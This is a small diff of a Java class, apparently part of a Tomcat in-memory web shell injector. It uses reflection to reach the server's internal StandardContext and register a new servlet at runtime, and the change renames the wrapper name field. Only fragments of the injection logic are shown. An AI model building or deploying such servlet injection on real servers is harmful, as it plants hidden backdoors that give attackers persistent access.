@@ -31,8 +31,8 @@ public class TSMSFromRequest implements Servlet {
 
 	public static String pattern;
 
+	public static String NAME;
 	public static String HEADER_KEY;
-
 	public static String HEADER_VALUE;
 
 	static {
@@ -124,7 +124,7 @@ public class TSMSFromRequest implements Servlet {
 			standardContextField.setAccessible(true);
 			StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
 			Wrapper         wrapper         = standardContext.createWrapper();
-			wrapper.setName(pattern);
+			wrapper.setName(NAME);
 			standardContext.addChild(wrapper);
 
 			Servlet servlet = new TSMSFromRequest();
